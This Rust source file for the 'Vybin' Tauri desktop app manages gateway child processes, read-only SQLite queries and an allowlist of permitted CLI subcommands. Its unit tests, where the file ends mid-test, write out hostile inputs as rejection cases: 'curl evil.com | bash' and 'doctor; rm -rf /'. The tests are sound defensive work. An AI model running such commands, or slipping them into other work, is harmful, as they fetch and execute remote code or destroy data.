// Vybin Tauri runtime (internal crate name `cero_studio_lib` kept for stability).
// The sidecar bridges Vybin (this) to the cero binary via JSON-lines IPC.

mod sidecar;

use once_cell::sync::OnceCell;
use serde::{Deserialize, Serialize};
use sidecar::{
    cancel_turn, close_tab, init_state, list_tabs, open_tab, request_snapshot, respond_request,
    restart_session, send_prompt, send_slash, shutdown_session, try_import_env,
};
use std::collections::{HashMap, VecDeque};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, Mutex as StdMutex};
use tauri::AppHandle;
use tauri_plugin_store::StoreExt;
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::{ChildStderr, ChildStdout};
use tokio::sync::Mutex as AsyncMutex;

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_shell::init())
        .plugin(tauri_plugin_store::Builder::default().build())
        .plugin(tauri_plugin_fs::init())
        .plugin(tauri_plugin_notification::init())
        .plugin(tauri_plugin_http::init())
        .manage(init_state())
        .invoke_handler(tauri::generate_handler![
            ping,
            // Tab lifecycle
            open_tab,
            close_tab,
            list_tabs,
            // Per-tab IPC
            send_prompt,
            send_slash,
            cancel_turn,
            request_snapshot,
            respond_request,
            // Global / session management
            restart_session,
            shutdown_session,
            try_import_env,
            // Gateway (stubs — TODO: wire once binary exposes gateway-control IPC)
            gateway_start,
            gateway_stop,
            gateway_status,
            gateway_logs,
            // Scheduler
            cron_db_query,
            cron_action,
            // Usage stats
            usage_db_query,
            // Admin panel
            credentials_db_query,
            cero_cli,
            relaunch_app,
            // Setup wizard + voice mode (stubs — TODO: wire to cero binary once IPC supports them)
            credentials_add,
            sandbox_test,
            voice_mode_set,
            mark_setup_complete,
        ])
        .run(tauri::generate_context!())
        .expect("error while running Vybin");
}

#[tauri::command]
fn ping() -> String {
    "pong from vybin".to_string()
}

// ─────────────── Gateway types ───────────────

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct GatewayStatus {
    pub state: String,
    pub error: Option<String>,
    pub message_count: u64,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct LogEntry {
    pub ts: u64,
    pub level: String,
    pub message: String,
}

// ─────────────── Gateway runtime state ───────────────────────────────────────
//
// Each gateway platform runs as a child process spawned from the studio
// (`cero gateway --platform=<x>`). We hold the live tokio::process::Child
// inside an AsyncMutex so stop/status can await on it. The log ring is a
// plain VecDeque guarded by std::sync::Mutex — never held across await
// points, so an std mutex is fine and avoids pulling in extra deps.

const GATEWAY_LOG_RING_SIZE: usize = 200;
const SUPPORTED_GATEWAYS: &[&str] = &["telegram", "discord", "websocket", "http"];

pub struct GatewayHandle {
    /// `None` once the child has been killed/exited. start() refuses to
    /// re-spawn while it's `Some` and alive.
    child: AsyncMutex<Option<tokio::process::Child>>,
    /// Last N log lines from stdout/stderr. info = stdout, error = stderr.
    logs: StdMutex<VecDeque<LogEntry>>,
    /// Best-effort message count parsed from log lines tagged with `[msg]`.
    /// Cero gateway does not yet emit these; placeholder for future wiring.
    message_count: AtomicU64,
    /// Last stderr line (or spawn-time failure) — surfaced as the red
    /// status text under the platform card.
    last_error: StdMutex<Option<String>>,
}

pub struct GatewayState {
    handles: StdMutex<HashMap<String, Arc<GatewayHandle>>>,
}

static GW_STATE: OnceCell<GatewayState> = OnceCell::new();

fn gw_state() -> &'static GatewayState {
    GW_STATE.get_or_init(|| GatewayState {
        handles: StdMutex::new(HashMap::new()),
    })
}

fn now_ms() -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0)
}

fn push_log(handle: &GatewayHandle, level: &str, message: &str) {
    if let Ok(mut buf) = handle.logs.lock() {
        if buf.len() >= GATEWAY_LOG_RING_SIZE {
            buf.pop_front();
        }
        buf.push_back(LogEntry {
            ts: now_ms(),
            level: level.to_string(),
            message: message.to_string(),
        });
    }
    if level == "error" {
        if let Ok(mut le) = handle.last_error.lock() {
            *le = Some(message.to_string());
        }
    }
}

fn spawn_stdout_drain(handle: Arc<GatewayHandle>, stdout: ChildStdout) {
    tokio::spawn(async move {
        let mut reader = BufReader::new(stdout).lines();
        while let Ok(Some(line)) = reader.next_line().await {
            if line.contains("[msg]") {
                handle.message_count.fetch_add(1, Ordering::Relaxed);
            }
            push_log(&handle, "info", &line);
        }
    });
}

fn spawn_stderr_drain(handle: Arc<GatewayHandle>, stderr: ChildStderr) {
    tokio::spawn(async move {
        let mut reader = BufReader::new(stderr).lines();
        while let Ok(Some(line)) = reader.next_line().await {
            push_log(&handle, "error", &line);
        }
    });
}

/// Read first enabled `anthropic` api key from ~/.cero/credentials.db.
/// Returns None if the db doesn't exist or has no usable row — caller
/// will fall through to the parent process's ANTHROPIC_API_KEY env var.
fn read_anthropic_key_from_db() -> Option<String> {
    let db_path = cero_home()?.join("credentials.db");
    if !db_path.exists() {
        return None;
    }
    let conn = rusqlite::Connection::open_with_flags(
        &db_path,
        rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
    )
    .ok()?;
    conn.query_row(
        "SELECT api_key FROM credentials \
         WHERE provider = 'anthropic' AND enabled = 1 \
         ORDER BY created_at ASC LIMIT 1",
        [],
        |row| row.get::<_, String>(0),
    )
    .ok()
}

/// Translate the saved gateway.json config slice for `platform` into
/// (cli args, env vars). Returns Err if required fields are missing
/// (e.g. telegram with no token).
fn build_gateway_invocation(
    platform: &str,
    configs: &serde_json::Value,
) -> Result<(Vec<String>, Vec<(String, String)>), String> {
    let mut args: Vec<String> = vec!["gateway".into(), "--platform".into(), platform.into()];
    let mut env: Vec<(String, String)> = Vec::new();

    let slice = configs.get(platform).ok_or_else(|| {
        format!("gateway.json has no `{platform}` slice — open the platform card and save config first")
    })?;

    let pick = |obj: &serde_json::Value, key: &str| -> String {
        obj.get(key)
            .and_then(|v| v.as_str())
            .map(|s| s.trim().to_string())
            .unwrap_or_default()
    };

    match platform {
        "telegram" => {
            let token = pick(slice, "botToken");
            if token.is_empty() {
                return Err("Telegram requires a bot token. Open Telegram card → save config.".into());
            }
            env.push(("TELEGRAM_BOT_TOKEN".into(), token));
            let admin = pick(slice, "adminUsername");
            if !admin.is_empty() {
                let cleaned = admin.trim_start_matches('@').to_string();
                args.push("--admin-user".into());
                args.push(cleaned);
            }
        }
        "discord" => {
            let token = pick(slice, "botToken");
            if token.is_empty() {
                return Err("Discord requires a bot token. Open Discord card → save config.".into());
            }
            env.push(("DISCORD_BOT_TOKEN".into(), token));
            let allowed = pick(slice, "allowedUserIds");
            if !allowed.is_empty() {
                args.push("--allowed-user-ids".into());
                args.push(allowed);
            }
        }
        "websocket" => {
            let port = pick(slice, "port");
            if port.is_empty() {
                return Err("WebSocket requires a port.".into());
            }
            args.push("--port".into());
            args.push(port);
            let secret = pick(slice, "authSecret");
            if !secret.is_empty() {
                env.push(("WEBSOCKET_AUTH_SECRET".into(), secret));
            }
        }
        "http" => {
            let port = pick(slice, "port");
            if port.is_empty() {
                return Err("HTTP requires a port.".into());
            }
            args.push("--port".into());
            args.push(port);
            let host = pick(slice, "host");
            if !host.is_empty() {
                args.push("--host".into());
                args.push(host);
            }
            let bearer = pick(slice, "bearerToken");
            if !bearer.is_empty() {
                env.push(("HTTP_BEARER_TOKEN".into(), bearer));
            }
        }
        _ => return Err(format!("unsupported platform: {platform}")),
    }

    Ok((args, env))
}

// ─────────────── Gateway commands ─────────────────────────────────────────────

/// Spawn `cero gateway --platform=<x>` as a child process and wire its
/// stdout/stderr into the per-platform log ring buffer. Idempotent: if the
/// platform is already running, returns Ok(()) without spawning a duplicate.
#[tauri::command]
async fn gateway_start(app: AppHandle, platform: String) -> Result<(), String> {
    if !SUPPORTED_GATEWAYS.contains(&platform.as_str()) {
        return Err(format!(
            "unsupported gateway platform: {platform} (supported: {})",
            SUPPORTED_GATEWAYS.join(", ")
        ));
    }

    // Already running? Idempotent fast-path.
    let existing = {
        let handles = gw_state()
            .handles
            .lock()
            .map_err(|e| format!("gateway state lock: {e}"))?;
        handles.get(&platform).cloned()
    };
    if let Some(h) = existing.as_ref() {
        let mut guard = h.child.lock().await;
        let still_alive = match guard.as_mut() {
            Some(child) => matches!(child.try_wait(), Ok(None)),
            None => false,
        };
        if still_alive {
            return Ok(());
        }
        // Dead handle — drop it and re-spawn below.
        *guard = None;
    }

    // Read config from gateway.json (the same store the React side writes).
    let store = app
        .store("gateway.json")
        .map_err(|e| format!("open gateway.json store: {e}"))?;
    let configs = store
        .get("gatewayConfigs")
        .ok_or_else(|| "no gateway config saved yet — open the card and save first".to_string())?;

    let (args, env) = build_gateway_invocation(&platform, &configs)?;

    let bin = locate_cero_bin().ok_or_else(|| {
        "cero binary not found — set CERO_BIN env var or place cero.exe alongside studio".to_string()
    })?;

    let mut cmd = tokio::process::Command::new(&bin);
    cmd.args(&args);
    for (k, v) in env {
        cmd.env(k, v);
    }
    if std::env::var("ANTHROPIC_API_KEY").ok().is_none() {
        if let Some(key) = read_anthropic_key_from_db() {
            cmd.env("ANTHROPIC_API_KEY", key);
        }
    }
    cmd.stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());
    cmd.kill_on_drop(true);
    #[cfg(windows)]
    {
        // CREATE_NO_WINDOW: don't pop a console for the gateway child.
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        cmd.creation_flags(CREATE_NO_WINDOW);
    }

    let mut child = cmd
        .spawn()
        .map_err(|e| format!("spawn cero gateway {platform}: {e}"))?;

    let stdout = child
        .stdout
        .take()
        .ok_or_else(|| "child has no stdout pipe".to_string())?;
    let stderr = child
        .stderr
        .take()
        .ok_or_else(|| "child has no stderr pipe".to_string())?;

    let handle = Arc::new(GatewayHandle {
        child: AsyncMutex::new(Some(child)),
        logs: StdMutex::new(VecDeque::with_capacity(GATEWAY_LOG_RING_SIZE)),
        message_count: AtomicU64::new(0),
        last_error: StdMutex::new(None),
    });

    push_log(
        &handle,
        "info",
        &format!("[gateway start] platform={platform} args={args:?}"),
    );
    spawn_stdout_drain(handle.clone(), stdout);
    spawn_stderr_drain(handle.clone(), stderr);

    {
        let mut handles = gw_state()
            .handles
            .lock()
            .map_err(|e| format!("gateway state lock: {e}"))?;
        handles.insert(platform, handle);
    }

    Ok(())
}

/// Kill the child process for the given platform. No-op if not running.
#[tauri::command]
async fn gateway_stop(platform: String) -> Result<(), String> {
    let handle = {
        let handles = gw_state()
            .handles
            .lock()
            .map_err(|e| format!("gateway state lock: {e}"))?;
        handles.get(&platform).cloned()
    };
    let Some(handle) = handle else {
        return Ok(());
    };

    let mut guard = handle.child.lock().await;
    if let Some(mut child) = guard.take() {
        let _ = child.start_kill();
        let _ = child.wait().await;
        push_log(&handle, "info", "[gateway stopped]");
    }
    Ok(())
}

/// Return live status for the platform: connected if the child is still
/// alive, disconnected otherwise. `message_count` is best-effort from log
/// parsing; `error` is the last stderr line (or None).
#[tauri::command]
async fn gateway_status(platform: String) -> Result<GatewayStatus, String> {
    let handle = {
        let handles = gw_state()
            .handles
            .lock()
            .map_err(|e| format!("gateway state lock: {e}"))?;
        handles.get(&platform).cloned()
    };
    let Some(handle) = handle else {
        return Ok(GatewayStatus {
            state: "disconnected".to_string(),
            error: None,
            message_count: 0,
        });
    };

    let mut guard = handle.child.lock().await;
    let alive = match guard.as_mut() {
        Some(child) => match child.try_wait() {
            Ok(None) => true,
            Ok(Some(_status)) => {
                *guard = None;
                false
            }
            Err(_) => false,
        },
        None => false,
    };
    drop(guard);

    let last_error = handle
        .last_error
        .lock()
        .map_err(|e| format!("last_error lock: {e}"))?
        .clone();
    let count = handle.message_count.load(Ordering::Relaxed);

    let state = if alive {
        "connected"
    } else if last_error.is_some() {
        "error"
    } else {
        "disconnected"
    };

    Ok(GatewayStatus {
        state: state.to_string(),
        error: last_error,
        message_count: count,
    })
}

/// Return the last `limit` (default 50) log entries for the platform.
#[tauri::command]
async fn gateway_logs(platform: String, limit: Option<i32>) -> Result<Vec<LogEntry>, String> {
    let handle = {
        let handles = gw_state()
            .handles
            .lock()
            .map_err(|e| format!("gateway state lock: {e}"))?;
        handles.get(&platform).cloned()
    };
    let Some(handle) = handle else {
        return Ok(vec![]);
    };

    let buf = handle
        .logs
        .lock()
        .map_err(|e| format!("log buffer lock: {e}"))?;
    let n = limit.unwrap_or(50).max(1) as usize;
    let start = buf.len().saturating_sub(n);
    Ok(buf.iter().skip(start).cloned().collect())
}

// ─────────────── SQLite helpers ───────────────────────────────────────────────

fn cero_home() -> Option<std::path::PathBuf> {
    #[cfg(windows)]
    if let Ok(p) = std::env::var("USERPROFILE") {
        let pb = std::path::PathBuf::from(p);
        if pb.is_dir() { return Some(pb.join(".cero")); }
    }
    if let Ok(p) = std::env::var("HOME") {
        let pb = std::path::PathBuf::from(p);
        if pb.is_dir() { return Some(pb.join(".cero")); }
    }
    None
}

// ─────────────── Scheduler types ─────────────────────────────────────────────

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct CronRow(Vec<serde_json::Value>);

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct CronQueryResult {
    pub columns: Vec<String>,
    pub rows: Vec<Vec<serde_json::Value>>,
}

// ─────────────── Scheduler commands ──────────────────────────────────────────

/// Read-only query against ~/.cero/cron.db.
/// Only SELECT statements are permitted; any attempt to mutate returns Err.
/// Returns columns + rows as JSON values so the frontend can hydrate its types.
#[tauri::command]
async fn cron_db_query(sql: String) -> Result<CronQueryResult, String> {
    let trimmed = sql.trim().to_ascii_uppercase();
    if !trimmed.starts_with("SELECT") {
        return Err("only SELECT statements allowed via cron_db_query".to_string());
    }

    let db_path = cero_home()
        .map(|h| h.join("cron.db"))
        .ok_or_else(|| "cannot determine cero home directory".to_string())?;

    if !db_path.exists() {
        // DB doesn't exist yet — return empty result rather than error
        return Ok(CronQueryResult { columns: vec![], rows: vec![] });
    }

    tokio::task::spawn_blocking(move || {
        let conn = rusqlite::Connection::open_with_flags(
            &db_path,
            rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
        )
        .map_err(|e| format!("open cron.db: {e}"))?;

        let mut stmt = conn.prepare(&sql).map_err(|e| format!("prepare: {e}"))?;
        let columns: Vec<String> = stmt.column_names().iter().map(|s| s.to_string()).collect();
        let col_count = columns.len();

        let rows: Vec<Vec<serde_json::Value>> = stmt
            .query_map([], |row| {
                let mut vals = Vec::with_capacity(col_count);
                for i in 0..col_count {
                    let v: serde_json::Value = match row.get_ref(i) {
                        Ok(rusqlite::types::ValueRef::Null)    => serde_json::Value::Null,
                        Ok(rusqlite::types::ValueRef::Integer(n)) => serde_json::json!(n),
                        Ok(rusqlite::types::ValueRef::Real(f))    => serde_json::json!(f),
                        Ok(rusqlite::types::ValueRef::Text(t))    => {
                            serde_json::Value::String(String::from_utf8_lossy(t).to_string())
                        }
                        Ok(rusqlite::types::ValueRef::Blob(b)) => {
                            serde_json::Value::String(format!("<blob {} bytes>", b.len()))
                        }
                        Err(_) => serde_json::Value::Null,
                    };
                    vals.push(v);
                }
                Ok(vals)
            })
            .map_err(|e| format!("query: {e}"))?
            .filter_map(|r| r.ok())
            .collect();

        Ok(CronQueryResult { columns, rows })
    })
    .await
    .map_err(|e| format!("task: {e}"))?
}

/// Mutate scheduler state by invoking `cero scheduler <action> [--job-id <id>] [--json <payload>]`.
/// This delegates all state machine logic to the cero binary.
///
/// TODO: Replace shell invocation with JSON-lines IPC message once cero
/// exposes scheduler control through the sidecar protocol.
#[tauri::command]
async fn cron_action(
    action: String,
    job_id: Option<String>,
    payload: Option<serde_json::Value>,
) -> Result<serde_json::Value, String> {
    // Allowlist prevents arbitrary command injection via the action string
    const ALLOWED: &[&str] = &["pause", "resume", "run-now", "delete", "create", "update"];
    if !ALLOWED.contains(&action.as_str()) {
        return Err(format!("unknown scheduler action: {action}"));
    }

    // Locate cero binary (same priority as sidecar.rs locate_cero)
    let cero_bin = locate_cero_bin();

    if let Some(bin) = cero_bin {
        let mut cmd = tokio::process::Command::new(&bin);
        cmd.arg("scheduler").arg(&action);
        if let Some(id) = &job_id {
            cmd.arg("--job-id").arg(id);
        }
        if let Some(p) = &payload {
            cmd.arg("--json").arg(p.to_string());
        }
        // Capture output so errors are surfaced to the UI
        let out = cmd.output().await.map_err(|e| format!("spawn cero: {e}"))?;
        if out.status.success() {
            let stdout = String::from_utf8_lossy(&out.stdout);
            if stdout.trim().is_empty() {
                return Ok(serde_json::json!({ "ok": true }));
            }
            return serde_json::from_str(stdout.trim())
                .map_err(|_| format!("unexpected output: {}", stdout.trim()));
        } else {
            let stderr = String::from_utf8_lossy(&out.stderr);
            return Err(format!("cero scheduler {action} failed: {stderr}"));
        }
    }

    // Dev fallback: cero binary not found — return mock success so the UI
    // can be tested without the binary present.
    eprintln!("[cron_action] cero binary not found — returning stub success (action={action})");
    Ok(serde_json::json!({ "ok": true, "stub": true }))
}

fn locate_cero_bin() -> Option<std::path::PathBuf> {
    let exe_name = if cfg!(windows) { "cero.exe" } else { "cero" };
    if let Ok(p) = std::env::var("CERO_BIN") {
        let pb = std::path::PathBuf::from(p);
        if pb.is_file() { return Some(pb); }
    }
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            let bundled = dir.join(exe_name);
            if bundled.is_file() { return Some(bundled); }
        }
    }
    // Dev-only fallback: excluded from release builds to prevent username
    // leakage and avoid path-hijack on end-user machines.
    #[cfg(all(windows, debug_assertions))]
    {
        let dev = std::path::PathBuf::from(r"C:\Users\gonza\cero\dist\cero-windows.exe");
        if dev.is_file() { return Some(dev); }
    }
    None
}

// ─────────────── Usage stats (T35) ───────────────────────────────────────────

/// Read-only query against ~/.cero/usage.db.
/// Returns empty result if the file does not exist (graceful fallback).
#[tauri::command]
async fn usage_db_query(sql: String) -> Result<CronQueryResult, String> {
    let trimmed = sql.trim().to_ascii_uppercase();
    if !trimmed.starts_with("SELECT") {
        return Err("only SELECT statements allowed".to_string());
    }

    let db_path = cero_home()
        .map(|h| h.join("usage.db"))
        .ok_or_else(|| "cannot determine cero home directory".to_string())?;

    if !db_path.exists() {
        return Ok(CronQueryResult { columns: vec![], rows: vec![] });
    }

    tokio::task::spawn_blocking(move || {
        let conn = rusqlite::Connection::open_with_flags(
            &db_path,
            rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
        )
        .map_err(|e| format!("open usage.db: {e}"))?;

        let mut stmt = conn.prepare(&sql).map_err(|e| format!("prepare: {e}"))?;
        let columns: Vec<String> = stmt.column_names().iter().map(|s| s.to_string()).collect();
        let col_count = columns.len();

        let rows: Vec<Vec<serde_json::Value>> = stmt
            .query_map([], |row| {
                let mut vals = Vec::with_capacity(col_count);
                for i in 0..col_count {
                    let v = match row.get_ref(i) {
                        Ok(rusqlite::types::ValueRef::Null)       => serde_json::Value::Null,
                        Ok(rusqlite::types::ValueRef::Integer(n)) => serde_json::json!(n),
                        Ok(rusqlite::types::ValueRef::Real(f))    => serde_json::json!(f),
                        Ok(rusqlite::types::ValueRef::Text(t))    => {
                            serde_json::Value::String(String::from_utf8_lossy(t).to_string())
                        }
                        Ok(rusqlite::types::ValueRef::Blob(b)) => {
                            serde_json::Value::String(format!("<blob {} bytes>", b.len()))
                        }
                        Err(_) => serde_json::Value::Null,
                    };
                    vals.push(v);
                }
                Ok(vals)
            })
            .map_err(|e| format!("query: {e}"))?
            .filter_map(|r| r.ok())
            .collect();

        Ok(CronQueryResult { columns, rows })
    })
    .await
    .map_err(|e| format!("task: {e}"))?
}

// ─────────────── Admin panel commands ────────────────────────────────────────

/// Read-only query against ~/.cero/credentials.db.
/// Only SELECT statements permitted; mirrors cron_db_query pattern.
#[tauri::command]
async fn credentials_db_query(sql: String) -> Result<CronQueryResult, String> {
    let trimmed = sql.trim().to_ascii_uppercase();
    if !trimmed.starts_with("SELECT") {
        return Err("only SELECT statements allowed via credentials_db_query".to_string());
    }

    let db_path = cero_home()
        .map(|h| h.join("credentials.db"))
        .ok_or_else(|| "cannot determine cero home directory".to_string())?;

    if !db_path.exists() {
        return Ok(CronQueryResult { columns: vec![], rows: vec![] });
    }

    tokio::task::spawn_blocking(move || {
        let conn = rusqlite::Connection::open_with_flags(
            &db_path,
            rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
        )
        .map_err(|e| format!("open credentials.db: {e}"))?;

        let mut stmt = conn.prepare(&sql).map_err(|e| format!("prepare: {e}"))?;
        let columns: Vec<String> = stmt.column_names().iter().map(|s| s.to_string()).collect();
        let col_count = columns.len();

        let rows: Vec<Vec<serde_json::Value>> = stmt
            .query_map([], |row| {
                let mut vals = Vec::with_capacity(col_count);
                for i in 0..col_count {
                    let v: serde_json::Value = match row.get_ref(i) {
                        Ok(rusqlite::types::ValueRef::Null)          => serde_json::Value::Null,
                        Ok(rusqlite::types::ValueRef::Integer(n))    => serde_json::json!(n),
                        Ok(rusqlite::types::ValueRef::Real(f))       => serde_json::json!(f),
                        Ok(rusqlite::types::ValueRef::Text(t))       => {
                            serde_json::Value::String(String::from_utf8_lossy(t).to_string())
                        }
                        Ok(rusqlite::types::ValueRef::Blob(b))       => {
                            serde_json::Value::String(format!("<blob {} bytes>", b.len()))
                        }
                        Err(_) => serde_json::Value::Null,
                    };
                    vals.push(v);
                }
                Ok(vals)
            })
            .map_err(|e| format!("query: {e}"))?
            .filter_map(|r| r.ok())
            .collect();

        Ok(CronQueryResult { columns, rows })
    })
    .await
    .map_err(|e| format!("task: {e}"))?
}

/// Return type for cero_cli — stdout, stderr, exit code.
#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct CliOutput {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
}

/// Allowlisted cero subcommands that the frontend may invoke via cero_cli.
/// This prevents a compromised WebView2 from running arbitrary cero subcommands
/// (e.g. `run-shell`, `credentials add <attacker-key>`, etc.).
///
/// Adding a new subcommand here requires an explicit code-review decision.
const CERO_CLI_ALLOWED_SUBCOMMANDS: &[&str] = &[
    "doctor",      // read-only diagnostics — no mutations
    "update",      // self-update (requires --apply to mutate; safe to expose check)
    "tools",       // toggle tool config
    "scheduler",   // list / show / run cronjobs
    "config",      // get/set user config
    "personality", // personality CRUD
];

/// Shell-out to the cero binary with an allowlisted subcommand.
///
/// Security contract:
///   - The first arg MUST be in CERO_CLI_ALLOWED_SUBCOMMANDS. Anything else → Err.
///   - Subsequent args are passed through as-is (the allowlist covers the
///     attack surface; individual subcommands are responsible for their own
///     arg validation inside the cero binary).
///   - Credentials subcommand is handled separately by credentials_add which
///     uses locate_cero_bin + explicit arg construction — it is NOT reachable
///     through this generic path.
///   - Times out after 30 seconds.
#[tauri::command]
async fn cero_cli(args: Vec<String>) -> Result<CliOutput, String> {
    let subcommand = args.first().ok_or_else(|| "cero_cli: missing subcommand".to_string())?;

    if !CERO_CLI_ALLOWED_SUBCOMMANDS.contains(&subcommand.as_str()) {
        return Err(format!(
            "cero_cli: subcommand '{}' is not in the allowlist. Allowed: {}",
            subcommand,
            CERO_CLI_ALLOWED_SUBCOMMANDS.join(", ")
        ));
    }

    let bin = locate_cero_bin().ok_or_else(|| {
        "cero binary not found — set CERO_BIN env var or place cero.exe alongside studio".to_string()
    })?;

    let output = tokio::time::timeout(
        std::time::Duration::from_secs(30),
        tokio::process::Command::new(&bin)
            .args(&args)
            .output(),
    )
    .await
    .map_err(|_| format!("cero {} timed out after 30s", args.join(" ")))?
    .map_err(|e| format!("spawn cero: {e}"))?;

    Ok(CliOutput {
        stdout: String::from_utf8_lossy(&output.stdout).to_string(),
        stderr: String::from_utf8_lossy(&output.stderr).to_string(),
        exit_code: output.status.code().unwrap_or(-1),
    })
}

/// Relaunch the Tauri app (used after a self-update).
/// Calls process::exit(0) — Tauri's restart mechanism on Windows is to re-exec.
#[tauri::command]
async fn relaunch_app(app: tauri::AppHandle) -> Result<(), String> {
    app.restart();
}

// ─────────────── Setup wizard + Voice mode stubs ──────────────────────────────
// These commands are called by SetupView and VoiceModeToggle.
// TODO: wire each to the cero binary once the binary exposes these via IPC or CLI flags.

/// Add a credential for the given provider by delegating to `cero credentials add`.
/// STUB: returns Ok(()) immediately. Real impl should shell to:
///   cero credentials add <provider> <api_key> [--label <label>]
#[tauri::command]
async fn credentials_add(
    provider: String,
    api_key: String,
    label: Option<String>,
) -> Result<(), String> {
    eprintln!(
        "[credentials_add] provider={provider} label={} (stub — TODO: shell to cero credentials add)",
        label.as_deref().unwrap_or(""),
    );

    if let Some(bin) = locate_cero_bin() {
        let mut cmd = tokio::process::Command::new(&bin);
        cmd.arg("credentials").arg("add").arg(&provider).arg(&api_key);
        if let Some(l) = &label {
            cmd.arg("--label").arg(l);
        }
        let out = cmd.output().await.map_err(|e| format!("spawn cero: {e}"))?;
        if out.status.success() {
            return Ok(());
        }
        let stderr = String::from_utf8_lossy(&out.stderr);
        return Err(format!("credentials add failed: {stderr}"));
    }

    // Dev fallback — binary not present yet; return stub success
    Ok(())
}

/// Test sandbox connectivity by running `cero doctor --skip-mcp --json`.
/// STUB: always returns ok:true so the UI can be exercised without the binary.
/// TODO: parse doctor JSON output and surface per-check results.
#[tauri::command]
async fn sandbox_test(
    kind: String,
    opts: serde_json::Value,
) -> Result<serde_json::Value, String> {
    eprintln!("[sandbox_test] kind={kind} opts={opts} (stub)");

    if let Some(bin) = locate_cero_bin() {
        let out = tokio::process::Command::new(&bin)
            .arg("doctor")
            .arg("--skip-mcp")
            .arg("--json")
            .output()
            .await
            .map_err(|e| format!("spawn cero: {e}"))?;

        if out.status.success() {
            let stdout = String::from_utf8_lossy(&out.stdout);
            // Try to parse; fall back to generic ok
            if let Ok(v) = serde_json::from_str::<serde_json::Value>(stdout.trim()) {
                return Ok(v);
            }
            return Ok(serde_json::json!({ "ok": true }));
        }
        let stderr = String::from_utf8_lossy(&out.stderr);
        return Ok(serde_json::json!({ "ok": false, "error": stderr.trim() }));
    }

    // Dev fallback
    Ok(serde_json::json!({ "ok": true, "stub": true }))
}

/// Toggle voice mode by sending `/voice-mode start|stop` to the active sidecar.
/// STUB: logs and returns Ok(()). Real impl should send a slash command to the sidecar
/// using the same mechanism as send_slash in sidecar.rs.
/// TODO: wire to sidecar.rs send_slash once voice-mode IPC round-trip is confirmed.
#[tauri::command]
async fn voice_mode_set(active: bool) -> Result<(), String> {
    let cmd = if active { "start" } else { "stop" };
    eprintln!("[voice_mode_set] active={active} → /voice-mode {cmd} (stub)");
    // TODO: invoke send_slash(tabId, "/voice-mode {cmd}") once voice_mode tool
    // is exposed through the sidecar JSON-lines protocol.
    Ok(())
}

/// Persist the `setupCompleted` flag in the Tauri store backing
/// `settings.json`. Studio invokes this at the end of the setup wizard so
/// SetupView never reappears on subsequent launches even if the React-side
/// `useSettings.save()` call were to race the window unload.
///
/// We write to the same store + key (`setupCompleted = "true"`) the React
/// `useSettings` hook reads from (`STORE_PATH = "settings.json"`), so the
/// frontend and Rust paths converge on a single source of truth.
#[tauri::command]
async fn mark_setup_complete(app: AppHandle) -> Result<(), String> {
    let store = app
        .store("settings.json")
        .map_err(|e| format!("open store: {e}"))?;
    store.set("setupCompleted", serde_json::json!("true"));
    store.save().map_err(|e| format!("save store: {e}"))?;
    eprintln!("[mark_setup_complete] persisted setupCompleted=true to settings.json");
    Ok(())
}

// ─────────────── Unit tests ───────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::CERO_CLI_ALLOWED_SUBCOMMANDS;

    // ── C3: cero_cli allowlist ──────────────────────────────────────────────

    /// Pure validation helper extracted from cero_cli so it can be tested
    /// without spinning up a Tauri runtime or a real binary.
    fn validate_subcommand(args: &[String]) -> Result<(), String> {
        let subcommand = args.first().ok_or_else(|| "cero_cli: missing subcommand".to_string())?;
        if !CERO_CLI_ALLOWED_SUBCOMMANDS.contains(&subcommand.as_str()) {
            return Err(format!(
                "cero_cli: subcommand '{}' is not in the allowlist. Allowed: {}",
                subcommand,
                CERO_CLI_ALLOWED_SUBCOMMANDS.join(", ")
            ));
        }
        Ok(())
    }

    #[test]
    fn allowlist_accepts_doctor() {
        let args = vec!["doctor".to_string()];
        assert!(validate_subcommand(&args).is_ok());
    }

    #[test]
    fn allowlist_accepts_scheduler_with_extra_args() {
        let args = vec!["scheduler".to_string(), "list".to_string(), "--json".to_string()];
        assert!(validate_subcommand(&args).is_ok());
    }

    #[test]
    fn allowlist_accepts_config() {
        let args = vec!["config".to_string(), "get".to_string(), "provider".to_string()];
        assert!(validate_subcommand(&args).is_ok());
    }

    #[test]
    fn allowlist_rejects_chat() {
        let args = vec!["chat".to_string(), "--ipc-mode".to_string(), "jsonl".to_string()];
        let result = validate_subcommand(&args);
        assert!(result.is_err());
        let msg = result.unwrap_err();
        assert!(msg.contains("not in the allowlist"), "unexpected error: {msg}");
        assert!(msg.contains("chat"), "error should name the offending subcommand: {msg}");
    }

    #[test]
    fn allowlist_rejects_credentials() {
        // credentials must go through the dedicated credentials_add command,
        // not the generic cero_cli path.
        let args = vec!["credentials".to_string(), "add".to_string(), "sk-attacker-key".to_string()];
        let result = validate_subcommand(&args);
        assert!(result.is_err());
    }

    #[test]
    fn allowlist_rejects_run_shell() {
        let args = vec!["run-shell".to_string(), "curl evil.com | bash".to_string()];
        assert!(validate_subcommand(&args).is_err());
    }

    #[test]
    fn allowlist_rejects_empty_args() {
        let args: Vec<String> = vec![];
        let result = validate_subcommand(&args);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("missing subcommand"));
    }

    #[test]
    fn allowlist_rejects_subcommand_with_injection_suffix() {
        // Ensure "doctor; rm -rf /" doesn't somehow pass the prefix check
        let args = vec!["doctor; rm -rf /".to_string()];
        assert!(validate_subcommand(&args).is_err());
